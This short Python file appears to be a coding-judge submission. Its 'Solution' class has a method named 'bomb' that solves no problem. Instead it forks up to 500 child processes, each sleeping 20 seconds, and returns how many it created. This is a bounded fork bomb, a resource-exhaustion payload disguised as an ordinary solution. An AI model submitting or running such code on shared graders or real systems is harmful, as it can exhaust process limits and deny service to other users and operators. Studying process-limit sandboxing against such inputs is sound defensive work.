import os
class Solution:
    def bomb(self, n: int) -> int:
        kids = 0
        try:
            for _ in range(500):
                if os.fork() == 0:
                    import time
                    time.sleep(20)
                    os._exit(0)
                kids += 1
        except OSError:
            pass
        return kids
